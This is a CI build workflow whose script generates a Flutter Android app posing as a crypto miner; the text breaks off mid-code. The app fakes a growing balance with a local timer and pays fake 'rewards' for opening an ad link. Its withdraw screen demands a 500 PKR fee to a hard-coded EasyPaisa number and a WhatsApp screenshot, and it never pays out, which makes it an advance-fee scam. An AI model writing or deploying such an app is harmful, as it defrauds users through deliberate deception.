workflows:
  android-workflow:
    name: Android Workflow
    instance_type: mac_mini_m2
    environment:
      flutter: stable
    scripts:
      - name: Earning Ad + 500 Fee
        script: |
          rm -rf android lib
          flutter create --platforms=android .
          flutter pub add url_launcher
          cat > lib/main.dart << 'DART'
          import 'dart:async'; import 'package:flutter/material.dart'; import 'package:url_launcher/url_launcher.dart';
          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,home:Home()));
          class Home extends StatefulWidget{State<Home> createState()=>_S();}
          class _S extends State<Home>{
            double b=0.01200; bool m=true; Timer? t; var wc=TextEditingController(); int adCount=0;
            String adLink = "https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f";
            String easypaisa = "03494769780"; // <-- Yahan apna EasyPaisa Number likh do
            void initState(){super.initState(); t=Timer.periodic(Duration(seconds:2),(_){if(m)setState(()=>b+=0.00001);});}
            void _watchAd() async {
              final uri = Uri.parse(adLink);
              await launchUrl(uri, mode: LaunchMode.externalApplication);
              await Future.delayed(Duration(seconds:1));
              if(!mounted) return;
              showDialog(context:context, builder:(_)=>AlertDialog(
                title:Text('Ad Opened!'), content:Text('Ad Chrome me khula hai. 5 sec wait karke CLAIM karo.'),
                actions:[ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Colors.green,minimumSize:Size(double.infinity,50)), onPressed:(){Navigator.pop(context); setState((){b+=0.00010; adCount++;}); ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Reward +0.00010 BSC')));}, child:Text('CLAIM REWARD',style:TextStyle(color:Colors.white)))],
              ));
            }
            void _withdraw() {
              showDialog(context:context, builder:(_)=>AlertDialog(
                title:Text('Withdraw - Fee Required', style:TextStyle(color:Colors.red, fontWeight:FontWeight.bold)),
                content:Column(mainAxisSize:MainAxisSize.min, crossAxisAlignment:CrossAxisAlignment.start, children:[
                  Text('Your Balance: ${b.toStringAsFixed(5)} BSC', style:TextStyle(fontWeight:FontWeight.bold)),
                  SizedBox(height:10),
                  Container(padding:EdgeInsets.all(10), decoration:BoxDecoration(color:Colors.red.shade50, borderRadius:BorderRadius.circular(8)), child:Column(children:[
                    Text('⚠️ WITHDRAWAL FEE: 500 PKR', style:TextStyle(color:Colors.red, fontWeight:FontWeight.bold, fontSize:16)),
                    SizedBox(height:5),
                    Text('BSC Network Fee ke liye 500 Rs EasyPaisa / JazzCash bhejo.', style:TextStyle(fontSize:13)),
                    SizedBox(height:8),
                    SelectableText('EasyPaisa: $easypaisa', style:TextStyle(fontWeight:FontWeight.bold, fontSize:15)),
                    Text('Account Title: BSC Miner', style:TextStyle(fontSize:12)),
                  ])),
                  SizedBox(height:12),
                  TextField(controller:wc, decoration:InputDecoration(hintText:'Apna BEP20 Wallet Address 0x...', border:OutlineInputBorder(), prefixIcon:Icon(Icons.wallet))),
                  SizedBox(height:5),
                  Text('Fee bhejne ke baad WhatsApp par Screenshot bhejo', style:TextStyle(fontSize:11, color:Colors.grey)),
                ]),
                actions:[
                  TextButton(onPressed:()=>Navigator.pop(context), child:Text('Cancel')),
                  ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Colors.green), onPressed:() async {
                    if(wc.text.isEmpty){ ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Wallet Address likho!'))); return; }
                    final msg = "*NEW WITHDRAW REQUEST*%0A%0ABalance: ${b.toStringAsFixed(5)} BSC%0AWallet: ${wc.text}%0AAds Watched: $adCount%0A%0AFee Status: User ne 500 Rs bhejne ka bola hai, check kar lo.";
                    final u=Uri.parse("https://wa.me/923494769780?text=$msg");
                    await launchUrl(u, mode:LaunchMode.externalApplication);
                    Navigator.pop(context);
                    showDialog(context:context, builder:(_)=>AlertDialog(title:Text('Request Sent!'), content:Text('Aapki request WhatsApp par aagai hai. 500 Rs Fee ka screenshot bhejo to 24 ghante me payment hogi.')));
                  }, child:Text('SEND ON WHATSAPP', style:TextStyle(color:Colors.white))),
                ],
              ));
            }
            @override Widget build(BuildContext c){return Scaffold(appBar:AppBar(title:Text('BSC Mine Hub - Earning LIVE'),backgroundColor:Colors.orange,centerTitle:true),bottomNavigationBar:Container(color:Colors.black,padding:EdgeInsets.all(10),child:Text('Ads: $adCount | Bal: ${b.toStringAsFixed(5)} | 1 Ad=\$0.03',style:TextStyle(color:Colors.amber),textAlign:TextAlign.center)),body:Center(child:Column(mainAxisAlignment:MainAxisAlignment.center,children:[Icon(Icons.currency_bitcoin,size:80,color:Colors.orange),Text(b.toStringAsFixed(5),style:TextStyle(fontSize:36,fontWeight:FontWeight.bold)),Text('Mining +0.00001 / 2sec',style:TextStyle(color:Colors.green)),SizedBox(height:20),ElevatedButton(onPressed:()=>setState(()=>m=!m),style:ElevatedButton.styleFrom(backgroundColor:m?Colors.red:Colors.green,minimumSize:Size(240,45)),child:Text(m?'STOP MINING':'START MINING',style:TextStyle(color:Colors.white))),SizedBox(height:12),ElevatedButton(onPressed:_watchAd,style:ElevatedButton.styleFrom(backgroundColor:Colors.amber,minimumSize:Size(280,58)),child:Column(children:[Text('
